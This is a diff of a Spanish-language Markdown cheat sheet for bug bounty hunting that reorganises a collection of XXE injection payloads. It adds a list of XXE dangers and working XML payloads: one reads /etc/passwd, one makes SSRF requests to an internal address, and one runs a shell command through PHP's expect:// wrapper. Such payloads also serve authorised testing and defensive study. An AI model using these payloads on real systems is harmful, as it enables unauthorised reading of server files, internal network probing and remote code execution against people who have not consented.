@@ -11,29 +11,60 @@ tags: [ Web, Bug Bounty, Payloads ]
 Algo metodos de inyectar una XXE.
 
 # Table of Contents
-1. [Payloads](#XXEpayloads)
-2. [SSRF](#XXEaSSRF)
-3. [Blind en peticion](#BlindXXE)
-4. [Bypass XXE](#XXEBypass)
-5. [Out-Of-Band](#OutOFBand)
+1. [Peligros en los ataques XXE](#PeligrosXXE)
+2. [Payloads](#XXEpayloads)
+    2.1. [XXE a LFI](#XXEaLFI)
+    2.2. [XXE a SSRF](#XXEaSSRF)
+    2.3. [XXE a RCE](#XXEaRCE)
+6. [Blind en peticion](#BlindXXE)
+7. [Bypass XXE](#XXEBypass)
+8. [Out-Of-Band](#OutOFBand)
 
-### 1- XXE payloads <a name="XXEpayloads"></a>
-**1.1- LFI Test**
+---
+
+### 1- Peligros en los ataques XXE <a name="PeligrosXXE"></a>
+- **Enumerar puertos y dominios en direcciones internas a la red:**
+Atraves de las peticiones ir enumerando la red 
+- **Enumerar puertos abiertos en otras direcciones extrernas**
+ Hacer una enumeracion de puertos mediante peticiones.
+- **Exfiltrar informacion critica:**
+Seria posible obtener archivos internos del servidor incluso en servidores de su red local, lo cual es peligroso.
+- **Denegacion del servicio**
+- **Ejecutar codigo:** 
+Si el servidor dispone del modulo "expect" de PHP, seria posible ejecutar codigo y poder llegar a poder ejecutar comandos.
+Algo así:
+[XXE a RCE](#XXEaRCE)
+
+---
+### 2- XXE payloads <a name="XXEpayloads"></a>
+**2.1- LFI Test** <a name="XXEaLFI"></a>
+Ver archivos internos del servidor
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <foo>&xxe;</foo>
 ```
----
-### 2- XXE a SSRF <a name="XXEaSSRF"></a>
-**2.1- Viendo archivos de un servidor interno**
 
+**2.2- XXE a SSRF** <a name="XXEaSSRF"></a>
+Enumerar la red local del servidor
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "https://192.168.0.1">]>
 <foo>&xxe;</foo>
+```
+
+**2.3-XXE a RCE** <a name="XXEaRCE"></a>
+Abusando del modulo expect de php(Se requiere tener este modulo en el servidor)**
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [ <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+    <checkproduct>
+       <productId>&xxe;</productId>
+       <storeId>2</storeId>
+    </checkproduct>
 ```
 
 ---
